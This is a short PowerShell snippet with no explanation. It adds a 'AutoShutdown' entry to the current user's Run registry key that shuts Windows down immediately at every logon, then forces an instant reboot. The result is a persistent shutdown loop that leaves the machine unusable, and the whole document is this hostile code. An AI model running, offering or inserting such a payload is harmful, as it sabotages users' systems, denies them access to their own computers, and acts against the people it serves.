Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AutoShutdown" -Value "shutdown /s /t 0"
shutdown /r /t 0
